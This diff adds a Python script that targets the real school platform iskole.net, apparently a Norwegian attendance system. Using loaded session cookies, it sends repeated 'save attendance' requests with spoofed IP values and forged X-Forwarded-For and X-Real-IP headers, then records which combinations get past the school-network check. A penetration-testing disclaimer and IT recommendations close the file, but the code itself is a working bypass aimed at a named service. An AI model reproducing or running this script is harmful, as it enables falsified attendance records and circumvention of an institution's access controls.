@@ -1,0 +1,471 @@
+import requests
+import json
+import os
+import socket
+import time
+import threading
+from datetime import datetime
+import subprocess
+import itertools
+
+class NetworkBypassTester:
+    def __init__(self, cookies_file="cookies.json"):
+        self.cookies = self.load_cookies(cookies_file)
+        self.results = []
+        self.test_count = 0
+        self.success_count = 0
+        
+    def load_cookies(self, cookies_file):
+        """Load cookies from JSON file"""
+        try:
+            with open(cookies_file, 'r') as f:
+                cookies_data = json.load(f)
+            
+            cookies = {}
+            for cookie in cookies_data:
+                cookies[cookie['name']] = cookie['value']
+            
+            return cookies
+        except Exception as e:
+            print(f"Error loading cookies: {e}")
+            return None
+
+    def get_network_info(self):
+        """Get current network information"""
+        try:
+            public_ip = requests.get('https://api.ipify.org', timeout=5).text
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            local_ip = s.getsockname()[0]
+            s.close()
+            return public_ip, local_ip
+        except Exception as e:
+            return "0.0.0.0", "0.0.0.0"
+
+    def generate_test_ips(self):
+        """Generate comprehensive list of IPs to test"""
+        test_ips = []
+        
+        # Common gateway IPs
+        gateways = [
+            "10.0.0.1", "10.0.1.1", "10.1.0.1", "10.10.0.1", "10.11.0.1",
+            "192.168.1.1", "192.168.0.1", "192.168.2.1", "192.168.10.1",
+            "172.16.0.1", "172.20.0.1", "172.16.1.1"
+        ]
+        test_ips.extend(gateways)
+        
+        # Common host ranges
+        base_ranges = [
+            "10.0.0", "10.0.1", "10.1.0", "10.10.0", "10.11.0",
+            "192.168.1", "192.168.0", "192.168.2", "192.168.10",
+            "172.16.0", "172.16.1", "172.20.0"
+        ]
+        
+        for base in base_ranges:
+            for host in [2, 5, 10, 20, 50, 100, 150, 200, 254]:
+                test_ips.append(f"{base}.{host}")
+        
+        # Norwegian academic/school networks
+        norwegian_ranges = [
+            "129.241.1.1", "129.241.1.100", "129.241.10.1", "129.241.50.1",
+            "158.36.1.1", "158.36.1.100", "158.36.10.1", "158.36.50.1",
+            "193.157.1.1", "193.157.1.100", "193.157.10.1"
+        ]
+        test_ips.extend(norwegian_ranges)
+        
+        # Edge cases and special IPs
+        special_cases = [
+            "127.0.0.1", "0.0.0.0", "255.255.255.255",
+            "", None, "localhost", "school-network"
+        ]
+        test_ips.extend(special_cases)
+        
+        return test_ips
+
+    def generate_header_combinations(self):
+        """Generate different header combinations to test"""
+        base_headers = [
+            "X-Forwarded-For", "X-Real-IP", "Client-IP", "X-Originating-IP",
+            "CF-Connecting-IP", "X-Client-IP", "X-Forwarded", "Forwarded-For"
+        ]
+        
+        test_ips = ["10.0.0.100", "192.168.1.100", "172.16.0.100", "127.0.0.1"]
+        
+        header_combos = []
+        
+        # Single headers
+        for header in base_headers:
+            for ip in test_ips:
+                header_combos.append({header: ip})
+        
+        # Multiple headers with same IP
+        for ip in test_ips:
+            combo = {}
+            for header in base_headers[:4]:  # Use first 4 headers
+                combo[header] = ip
+            header_combos.append(combo)
+        
+        return header_combos
+
+    def test_single_request(self, test_name, headers=None, payload_ip=None, item_data=None):
+        """Test a single request configuration"""
+        if not self.cookies:
+            return False
+        
+        # Default item data
+        if not item_data:
+            item_data = {
+                "Id": 7,
+                "Fag": "PB3A STU",
+                "Stkode": "PB",
+                "KlTrinn": "3",
+                "KlId": "A",
+                "KNavn": "STU",
+                "GruppeNr": "$",
+                "Dato": "20250922",
+                "Timenr": 22905960,
+                "StartKl": "0945",
+                "SluttKl": "1030",
+                "UndervisningPaagaar": 0,
+                "Typefravaer": "M",
+                "ElevForerTilstedevaerelse": 0,
+                "Kollisjon": 0,
+                "TidsromTilstedevaerelse": "09:45 - 10:00"
+            }
+        
+        # Prepare parameters
+        fravaerstype = "M" if item_data["Typefravaer"] is None else item_data["Typefravaer"]
+        public_ip, local_ip = self.get_network_info()
+        
+        # Use payload_ip if provided, otherwise use local_ip
+        if payload_ip is None:
+            test_ip = local_ip
+        elif payload_ip == "":
+            test_ip = ""
+        else:
+            test_ip = payload_ip
+        
+        parameters = [
+            {"fylkeid": "00"},
+            {"skoleid": "312"},
+            {"planperi": "2025-26"},
+            {"ansidato": item_data["Dato"]},
+            {"stkode": item_data["Stkode"]},
+            {"kl_trinn": item_data["KlTrinn"]},
+            {"kl_id": item_data["KlId"]},
+            {"k_navn": item_data["KNavn"]},
+            {"gruppe_nr": item_data["GruppeNr"]},
+            {"timenr": item_data["Timenr"]},
+            {"fravaerstype": fravaerstype},
+            {"ip": test_ip}
+        ]
+        
+        payload = {
+            "name": "lagre_oppmote",
+            "parameters": parameters
+        }
+        
+        # Extract cookies
+        jsessionid = self.cookies.get('JSESSIONID')
+        wl_authcookie = self.cookies.get('_WL_AUTHCOOKIE_JSESSIONID')
+        oracle_bmc_route = self.cookies.get('X-Oracle-BMC-LBS-Route')
+        
+        jsessionid_clean = jsessionid.split('!')[0] if '!' in jsessionid else jsessionid
+        url = f"https://iskole.net/iskole_elev/rest/v0/VoTimeplan_elev_oppmote;jsessionid={jsessionid}"
+        
+        # Base headers
+        request_headers = {
+            "Host": "iskole.net",
+            "Cookie": f"X-Oracle-BMC-LBS-Route={oracle_bmc_route}; JSESSIONID={jsessionid_clean}; _WL_AUTHCOOKIE_JSESSIONID={wl_authcookie}",
+            "Sec-Ch-Ua-Platform": "\"Windows\"",
+            "Accept-Language": "nb-NO,nb;q=0.9",
+            "Sec-Ch-Ua": "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
+            "Sec-Ch-Ua-Mobile": "?0",
+            "X-Requested-With": "XMLHttpRequest",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36",
+            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "Content-Type": "application/vnd.oracle.adf.action+json",
+            "Origin": "https://iskole.net",
+            "Sec-Fetch-Site": "same-origin",
+            "Sec-Fetch-Mode": "cors",
+            "Sec-Fetch-Dest": "empty",
+            "Referer": "https://iskole.net/elev/?isFeideinnlogget=true&ojr=fravar",
+            "Accept-Encoding": "gzip, deflate, br",
+            "Priority": "u=4, i",
+            "Connection": "keep-alive"
+        }
+        
+        # Add custom headers if provided
+        if headers:
+            request_headers.update(headers)
+        
+        try:
+            start_time = time.time()
+            response = requests.post(url, json=payload, headers=request_headers, timeout=10)
+            response_time = time.time() - start_time
+            
+            success = False
+            error_msg = "Unknown error"
+            
+            if response.status_code == 200:
+                try:
+                    response_json = response.json()
+                    result = json.loads(response_json.get('result', '{}'))
+                    if result.get('retval') == 0:
+                        success = True
+                        error_msg = "SUCCESS"
+                    else:
+                        error_msg = result.get('errmsg', 'Unknown error')
+                except:
+                    error_msg = response.text
+            else:
+                error_msg = f"HTTP {response.status_code}"
+            
+            # Record result
+            result_entry = {
+                "test_name": test_name,
+                "timestamp": datetime.now().isoformat(),
+                "success": success,
+                "payload_ip": test_ip,
+                "headers": headers or {},
+                "response_time": response_time,
+                "error_msg": error_msg,
+                "status_code": response.status_code,
+                "public_ip": public_ip,
+                "local_ip": local_ip
+            }
+            
+            self.results.append(result_entry)
+            self.test_count += 1
+            
+            if success:
+                self.success_count += 1
+                print(f"🎉 SUCCESS #{self.success_count}: {test_name}")
+                print(f"   Payload IP: {test_ip}")
+                if headers:
+                    print(f"   Headers: {headers}")
+            else:
+                print(f"❌ FAILED ({self.test_count}): {test_name} - {error_msg}")
+            
+            return success
+            
+        except Exception as e:
+            error_entry = {
+                "test_name": test_name,
+                "timestamp": datetime.now().isoformat(),
+                "success": False,
+                "payload_ip": test_ip,
+                "headers": headers or {},
+                "response_time": 0,
+                "error_msg": str(e),
+                "status_code": 0,
+                "public_ip": public_ip,
+                "local_ip": local_ip
+            }
+            
+            self.results.append(error_entry)
+            self.test_count += 1
+            print(f"💥 ERROR ({self.test_count}): {test_name} - {str(e)}")
+            return False
+
+    def run_comprehensive_test(self):
+        """Run all tests comprehensively"""
+        public_ip, local_ip = self.get_network_info()
+        print(f"🌐 Starting comprehensive test from {public_ip} (local: {local_ip})")
+        print(f"📅 Test started at: {datetime.now()}")
+        print("="*80)
+        
+        # Test 1: Baseline
+        print("\n🔍 Phase 1: Baseline Test")
+        self.test_single_request("Baseline")
+        
+        # Test 2: All IP variations in payload
+        print("\n🔍 Phase 2: Testing IP variations in payload")
+        test_ips = self.generate_test_ips()
+        
+        for i, ip in enumerate(test_ips, 1):
+            test_name = f"Payload_IP_{i}_{ip}".replace(".", "_").replace(" ", "_")
+            self.test_single_request(test_name, payload_ip=ip)
+            
+            # Small delay to avoid overwhelming the server
+            time.sleep(0.1)
+        
+        # Test 3: Header combinations
+        print("\n🔍 Phase 3: Testing header combinations")
+        header_combos = self.generate_header_combinations()
+        
+        for i, headers in enumerate(header_combos, 1):
+            test_name = f"Headers_{i}"
+            self.test_single_request(test_name, headers=headers)
+            time.sleep(0.1)
+        
+        # Test 4: Combined header + payload IP tests
+        print("\n🔍 Phase 4: Testing combined header + payload IP")
+        priority_ips = ["10.0.0.100", "192.168.1.100", "172.16.0.100", "127.0.0.1"]
+        priority_headers = [
+            {"X-Forwarded-For": "10.0.0.100", "X-Real-IP": "10.0.0.100"},
+            {"X-Forwarded-For": "192.168.1.100", "X-Real-IP": "192.168.1.100"}
+        ]
+        
+        for ip in priority_ips:
+            for j, headers in enumerate(priority_headers):
+                # Match header IP with payload IP
+                matching_ip = list(headers.values())[0]
+                test_name = f"Combined_{ip}_{j}"
+                self.test_single_request(test_name, headers=headers, payload_ip=matching_ip)
+                time.sleep(0.1)
+
+    def save_results(self, filename=None):
+        """Save results to JSON file"""
+        if not filename:
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            public_ip, _ = self.get_network_info()
+            safe_ip = public_ip.replace(".", "_")
+            filename = f"bypass_test_results_{timestamp}_{safe_ip}.json"
+        
+        with open(filename, 'w') as f:
+            json.dump({
+                "test_metadata": {
+                    "total_tests": self.test_count,
+                    "successful_bypasses": self.success_count,
+                    "test_date": datetime.now().isoformat(),
+                    "public_ip": self.get_network_info()[0],
+                    "local_ip": self.get_network_info()[1]
+                },
+                "results": self.results
+            }, f, indent=2)
+        
+        return filename
+
+    def print_summary(self):
+        """Print test summary"""
+        print("\n" + "="*80)
+        print("🎯 TEST SUMMARY")
+        print("="*80)
+        
+        print(f"Total tests run: {self.test_count}")
+        print(f"Successful bypasses: {self.success_count}")
+        print(f"Success rate: {(self.success_count/self.test_count*100):.1f}%" if self.test_count > 0 else "No tests run")
+        
+        if self.success_count > 0:
+            print(f"\n🎉 SUCCESSFUL BYPASSES:")
+            for result in self.results:
+                if result["success"]:
+                    print(f"  ✅ {result['test_name']}")
+                    print(f"     IP: {result['payload_ip']}")
+                    if result['headers']:
+                        print(f"     Headers: {result['headers']}")
+        
+        # Analyze response times for potential timing attacks
+        response_times = [r['response_time'] for r in self.results if r['response_time'] > 0]
+        if response_times:
+            avg_time = sum(response_times) / len(response_times)
+            print(f"\n⏱️  Average response time: {avg_time:.3f}s")
+            
+            # Look for unusually fast/slow responses
+            fast_responses = [r for r in self.results if r['response_time'] > 0 and r['response_time'] < avg_time * 0.5]
+            slow_responses = [r for r in self.results if r['response_time'] > avg_time * 2]
+            
+            if fast_responses:
+                print(f"⚡ Unusually fast responses ({len(fast_responses)}):")
+                for r in fast_responses[:5]:  # Show first 5
+                    print(f"   {r['test_name']}: {r['response_time']:.3f}s")
+            
+            if slow_responses:
+                print(f"🐌 Unusually slow responses ({len(slow_responses)}):")
+                for r in slow_responses[:5]:  # Show first 5
+                    print(f"   {r['test_name']}: {r['response_time']:.3f}s")
+
+    def compare_with_previous(self, previous_file):
+        """Compare current results with previous test"""
+        try:
+            with open(previous_file, 'r') as f:
+                previous_data = json.load(f)
+            
+            print(f"\n🔄 COMPARISON WITH PREVIOUS TEST")
+            print("="*50)
+            
+            prev_success = previous_data['test_metadata']['successful_bypasses']
+            curr_success = self.success_count
+            
+            print(f"Previous successful bypasses: {prev_success}")
+            print(f"Current successful bypasses: {curr_success}")
+            
+            if curr_success > prev_success:
+                print("🎉 More bypasses found this time!")
+            elif curr_success < prev_success:
+                print("⚠️  Fewer bypasses found (network might be more secure now)")
+            else:
+                print("➡️  Same number of bypasses")
+            
+            # Compare successful methods
+            prev_successes = [r['test_name'] for r in previous_data['results'] if r['success']]
+            curr_successes = [r['test_name'] for r in self.results if r['success']]
+            
+            new_methods = set(curr_successes) - set(prev_successes)
+            lost_methods = set(prev_successes) - set(curr_successes)
+            
+            if new_methods:
+                print(f"\n🆕 New successful methods:")
+                for method in new_methods:
+                    print(f"   {method}")
+            
+            if lost_methods:
+                print(f"\n❌ Methods that no longer work:")
+                for method in lost_methods:
+                    print(f"   {method}")
+                    
+        except FileNotFoundError:
+            print(f"⚠️  Previous results file not found: {previous_file}")
+        except Exception as e:
+            print(f"❌ Error comparing results: {e}")
+
+def main():
+    """Main function"""
+    print("🚀 AUTOMATED NETWORK BYPASS TESTING SUITE")
+    print("⚠️  For authorized penetration testing only")
+    print("="*80)
+    
+    # Initialize tester
+    tester = NetworkBypassTester()
+    
+    if not tester.cookies:
+        print("❌ Failed to load cookies. Make sure cookies.json exists.")
+        return
+    
+    print("✅ Cookies loaded successfully")
+    
+    # Ask if user wants to compare with previous results
+    compare_file = input("Enter previous results file to compare (or press Enter to skip): ").strip()
+    
+    # Run comprehensive test
+    tester.run_comprehensive_test()
+    
+    # Print summary
+    tester.print_summary()
+    
+    # Save results
+    results_file = tester.save_results()
+    print(f"\n💾 Results saved to: {results_file}")
+    
+    # Compare with previous if requested
+    if compare_file and os.path.exists(compare_file):
+        tester.compare_with_previous(compare_file)
+    
+    print("\n🎯 RECOMMENDATIONS FOR IT TEAM:")
+    if tester.success_count > 0:
+        print("❗ CRITICAL: Network bypass methods found!")
+        print("  - Review IP validation logic")
+        print("  - Ensure using REMOTE_ADDR for IP detection")
+        print("  - Don't trust client-provided headers")
+        print("  - Consider additional authentication factors")
+    else:
+        print("✅ No bypasses found - network security appears robust")
+        print("  - IP validation is working correctly")
+        print("  - Consider testing from different physical locations")
+    
+    print(f"\n📋 Full report available in: {results_file}")
+    print("🚀 Test complete!")
+
+if __name__ == "__main__":
+    main()
